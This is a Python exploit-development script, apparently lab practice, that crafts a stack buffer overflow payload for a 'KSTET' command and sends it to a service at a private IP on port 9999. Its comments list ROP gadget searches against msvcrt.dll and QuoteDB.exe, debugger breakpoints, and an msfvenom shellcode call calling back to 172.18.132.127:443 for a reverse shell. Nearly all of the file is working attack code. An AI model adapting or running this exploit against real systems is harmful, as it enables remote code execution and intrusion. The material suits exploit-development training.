import socket, time, sys, struct
from struct import pack
from ExploitFramework import *

"""
.load narly; !nmod
struct.pack("<I", (EIP))
python3 gadgets.py --syntax 2 -f /home/kali/Desktop/Reverse/msvcrt.dll /home/kali/Desktop/Reverse/QuoteDB.exe -s 'pop ecx'
python3 gadgets.py --syntax 2 -f /home/kali/Desktop/Reverse/msvcrt.dll /home/kali/Desktop/Reverse/QuoteDB.exe -s 'mov esi' -c 10
python3 gadgets.py --syntax 2 -f /home/kali/Desktop/Reverse/msvcrt.dll /home/kali/Desktop/Reverse/QuoteDB.exe -r -a
getMsfVenomShellcode('172.18.132.127', '443', badchars=bc.getBadChars())
msf-nasm_shell
"""

##############################################
# PARAMS
##############################################
ip = "172.18.132.3"
port = 9999
buf = b""
timeout = 1
offset = 70
fuzz_limit = 50000
fuzz_step = 100
bc = BadChars(b"\x00\x0a\x0d")
fuzz_pattern = b"AABCDCACD"
# s -a 0 L?80000000 "AABCDCACD"
##############################################

# bp 00401953; bp 00401F40; bp 004017EE; g

buf += b"KSTET "
# max 96 byte of space
buf += b"A" * offset
buf += b"BBBB"
buf += fuzz_pattern
buf += b"C" * 200

buf2 = fuzz_pattern
buf2 += b"C" * 500

# buf += patternCreate(96)
# patternOffset('63413363')
# buf += fuzz_pattern
# buf += b"A" * 8000


##############################################
# SEND EXPLOIT
##############################################
checkForBadChars(buf, bc.getBadChars())
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
connect = s.connect((ip, port))
print(s.recv(1024))
s.send(buf2)
print(s.recv(1024))
s.send(buf)
print(f"{GOOD} {len(buf)} bytes sent")
# print(s.recv(1024))
s.close()